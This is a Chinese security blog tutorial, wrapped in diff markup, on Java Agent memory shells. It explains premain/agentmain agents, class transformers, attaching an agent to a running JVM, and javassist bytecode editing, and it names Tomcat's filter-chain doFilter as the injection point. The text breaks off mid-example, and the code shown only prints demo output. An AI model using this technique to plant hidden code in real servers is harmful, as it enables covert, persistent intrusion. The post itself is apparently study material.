@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>初识Java Agent内存马 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="这个Agent内存马和之前分析的不太一样，毕竟涉及到java Agent这种我之前没有接触过的新技术，所以刚开始学起来可能会有些摸不着头脑。在此写一篇文章记录我初学java Agent内存马的一些认识和理解。 0x01 认识Java Agent在 jdk 1.5 之后引入了  java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识Java Agent内存马">
+<meta property="og:url" content="https://xilitter.github.io/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="这个Agent内存马和之前分析的不太一样，毕竟涉及到java Agent这种我之前没有接触过的新技术，所以刚开始学起来可能会有些摸不着头脑。在此写一篇文章记录我初学java Agent内存马的一些认识和理解。 0x01 认识Java Agent在 jdk 1.5 之后引入了  java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art03.png">
+<meta property="article:published_time" content="2023-08-30T06:49:53.000Z">
+<meta property="article:modified_time" content="2023-08-31T07:14:49.029Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art03.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '初识Java Agent内存马',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-08-31 15:14:49'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art03.png')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">初识Java Agent内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-30T06:49:53.000Z" title="发表于 2023-08-30 14:49:53">2023-08-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-31T07:14:49.029Z" title="更新于 2023-08-31 15:14:49">2023-08-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="初识Java Agent内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这个Agent内存马和之前分析的不太一样，毕竟涉及到java Agent这种我之前没有接触过的新技术，所以刚开始学起来可能会有些摸不着头脑。在此写一篇文章记录我初学java Agent内存马的一些认识和理解。</p>
+<h2 id="0x01-认识Java-Agent"><a href="#0x01-认识Java-Agent" class="headerlink" title="0x01 认识Java Agent"></a>0x01 认识Java Agent</h2><p>在 jdk 1.5 之后引入了  java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，通过 java.lang.instrument 实现的工具我们称之为 Java Agent ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法</p>
+<p>一般情况下，我们要修改java文件的内容就必须重新编译，而java agent技术可以在字节码层面上修改类，方法等，也有点像代码注入的方式。而本文要说的Agent内存马就利用动态修改字节码来将特定类的特定方法添加恶意代码。</p>
+<p>java agent也只是一个java类，只不过它和普通java类不一样，它是以 premain 和 agentmain 方法作为入口，而不是main 方法。</p>
+<blockquote>
+<ul>
+<li>实现<code>premain</code>方法，在JVM启动前加载。</li>
+<li>实现<code>agentmain</code>方法，在JVM启动后加载。</li>
+</ul>
+</blockquote>
+<p>接下来就从这两个方面认识java agent</p>
+<h3 id="启动前加载"><a href="#启动前加载" class="headerlink" title="启动前加载"></a>启动前加载</h3><p>那么首先就是要创建一个java agent类了，</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.AgentForward;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;===premain 方法被执行====&quot;</span>);</span><br><span class="line">        Class[] allLoadedClass = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class allLoadClass : allLoadedClass) &#123;</span><br><span class="line">            System.out.println(allLoadClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;===premain 方法被执行====&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>premain 方法有两个参数，agentArgs 就是普通的字符串参数，第二个参数是 Instrumentation 的一个对象，方法内的代码就是遍历并输出当前 JVM 中已加载的所有类的名称。</p>
+<h4 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h4><p><code>java.lang.instrument.Instrumentation</code> 是 Java 标准库中的一个接口，它允许开发者在运行时进行类加载和字节码转换等操作。这个接口通常在 Java Agent 中使用，用于在应用程序运行期间修改或监视类的行为。Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p>
+<p>它是一个接口，定义了一些方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 增加一个 Class 文件的转换器</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"><span class="comment">// 删除一个类转换器</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"><span class="comment">// 在类加载之后，重新定义 Class。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"><span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>主要来说一下addTransformer方法，添加一个类转换器，那么什么是转换器？继承了ClassFileTransformer的类，它的实现类必须要重写 transform 方法，每当类加载的时候，我们自己定义的Transformer 的 transform 就会自动拦截，在这个方法里我们可以对其拦截下来的字节码动态修改。</p>
+<p>自己定义一个类转换器</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.AgentForward;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;transform被执行&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了方便演示直接在方法里写个输出。</p>
+<h4 id="编辑manifest-mf文件"><a href="#编辑manifest-mf文件" class="headerlink" title="编辑manifest.mf文件"></a>编辑manifest.mf文件</h4><p>代码写完后还需要编写这个文件，类似于配置文件这种</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: com.AgentForward.Agent</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>第一行指定了文件的版本，Can-Redefine-Classes 这个属性指定了 Java Agent 是否允许重新定义类</p>
+<p>Can-Retransform-Classes 这个属性指定了 Java Agent 是否允许重新转换类，这两个属性一定要配置，不然会出错</p>
+<p>Premain-Class 这个属性指定了 Java Agent 的预加载类了，注意最后要添加一个换行。</p>
+<p>最后把这个项目编译成jar文件，具体怎么编译自行百度。</p>
+<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>重新创建一个java项目用作测试，修改配置，在VM选项中添加配置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-javaagent:out\production\java-agent.jar</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/1.png" class>
+
+<p>注意路径一定要写对</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/2.png" class>
+
+<p>启动springboot</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/3.png" class>
+
+<p>在启动之前会先执行premain方法，然后打印输出启动前加载的类，太多了</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/4.png" class>
+
+<p>类加载的时候也会被transform方法拦截</p>
+<h3 id="启动后加载"><a href="#启动后加载" class="headerlink" title="启动后加载"></a>启动后加载</h3><p>在现实场景中注入内存马肯定不会在程序启动前加载，而是在运行过程中修改字节码。</p>
+<p>这里就需要用到 agentmain 入口方法，编写一个Agent</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.AgentBackwards;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;agent 方法被调用&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也是输出一条日志，在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。其中一个就是 VirtualMachine 类</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/5.png" class>
+
+<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p>它是 Java Attach API 的核心部分之一，用于在运行时连接和管理 Java 虚拟机（JVM）进程。Attach API 允许外部工具（如 Java Agent）与正在运行的 JVM 进程进行交互，进行类加载、字节码转换、性能分析等操作。</p>
+<p>注意：Windows系统中，安装的jdk中无法找到这个类，所以需要手动将你jdk安装目录下：lib目录中的tools.jar添加进当前工程的Libraries中</p>
+<p>这个类里面定义了几种方法，例如LoadAgent，Attach 和 Detach。</p>
+<p>Attach 方法：接收一个运行中的JVM的进程号，远程连接到JVM上，例如</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br></pre></td></tr></table></figure>
+
+<p>LoadAgent 方法：允许向正在运行的JVM中注册一个Agent，进行类加载和字节码操作，这个方法接收Java Agent的位置路径。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vm.loadAgent(&quot;Agent的路径&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>Detach 方法：从运行的JVM上解除一个Agent</p>
+<h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>仍然是编写manifest.mf文件，道理都是一样的，编译成一个Agent的jar</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Agent-Class: com.AgentBackwards.Agent</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>启动springboot项目，命令行输入命令：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Jps <span class="literal">-l</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到JVM启动的进程号，注意启动的时候要将配置里面的VM选项删掉</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/6.png" class>
+
+<p>当然springboot启动的时候没有任何日志输出</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/7.png" class>
+
+<p>编写一个java类来远程连接JVM</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentInitializationException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AgentLoadException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.AttachNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentCommand</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">target</span> <span class="operator">=</span> VirtualMachine.attach(<span class="string">&quot;172432&quot;</span>);</span><br><span class="line">        target.loadAgent(<span class="string">&quot;D:\\javaweb\\java安全\\java-agentShell\\javaAgentTest\\out\\production\\java-agent.jar&quot;</span>);</span><br><span class="line">        target.detach();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行代码，将编译好的Agent注入到正在运行的JVM中</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/8.png" class>
+
+<p>日志打印出来了，说明运行过程中执行了agentmain 入口方法，当然我们重写的 transform 方法也会被执行，这里可以作为实现Agent内存马注入的地方。</p>
+<h2 id="0x02-Agent内存马分析"><a href="#0x02-Agent内存马分析" class="headerlink" title="0x02 Agent内存马分析"></a>0x02 Agent内存马分析</h2><h3 id="寻找关键方法修改"><a href="#寻找关键方法修改" class="headerlink" title="寻找关键方法修改"></a>寻找关键方法修改</h3><p>通过上文对Java agent的了解，我们需要将特定类的特定方法中添加恶意代码，那么寻找这个关键的类就是我们面临的第一个问题。</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/9.png" class>
+
+<p>在我们访问资源的时候会调用过滤器链中的过滤器，当用户的请求到达Servlet之前，一定会首先经过过滤器。它们都是在ApplicationFilterChain类里，它的dofilter方法</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/10.png" class>
+
+<p>封装了我们用户请求的 request 和 response，用此方法作为内存马的入口，可以完全控制请求和响应</p>
+<h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p>动态修改字节码肯定需要了解java的字节码编程。Javassist 提供了一个简单而强大的 API，使开发者能够直接在 Java 代码中进行字节码操作。使用 Javassist，你可以创建新的类、修改已有类的字段和方法、添加新的方法、修改方法体内的代码等，这里只简单说说对方法的修改。</p>
+<h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p>它是 Javassist 库中的一个核心类，它用于管理和操作类的字节码。简单来说，ClassPool就是一个容器，用于存放CtClass 对象的容器，通过代码获取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassPool cp = ClassPool.getDefault();</span><br></pre></td></tr></table></figure>
+
+<h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>在Javassist中每个需要编辑的class都对应一个CtCLass实例，CtCLass就是编译时的类，这些类会存储在Class Pool中，CtClass中的CtField和CtMethod分别对应Java中的字段和方法。通过CtClass对象即可对类新增字段和修改方法等操作</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/11.png" class>
+
+<h4 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h4><p>举一个修改方法的小例子就能体会到，给方法内部添加代码通常会使用 setBody 方法，然而添加代码之外还有向前插入和向后插入，方法分别为insertBefore和insertAfter</p>
+<p>由于我们是需要修改已有方法的代码，为了不破坏程序原本的功能，不再使用setBody 方法，采用insertBefore 方法做一个简单的例子</p>
+<p>编写一个测试类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;this is test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用 javassist 字节码编程在此方法添加一句输出试试</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javassist;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassistTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="comment">//创建一个Class池，也就是容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//获取测试类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(<span class="string">&quot;com.javassist.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//获取测试类中的目标方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//利用insertBefore方法在测试类方法里添加一行新的输出</span></span><br><span class="line">        ctMethod.insertBefore(<span class="string">&quot;System.out.println(\&quot;修改成功啦\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//写入</span></span><br><span class="line">        ctClass.writeFile();</span><br><span class="line">        <span class="comment">//加载该类的字节码(必不可少)</span></span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="comment">//测试</span></span><br><span class="line">        <span class="type">Demo</span> <span class="variable">demo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">        demo.test();</span><br><span class="line">    &#125;</span><br><span 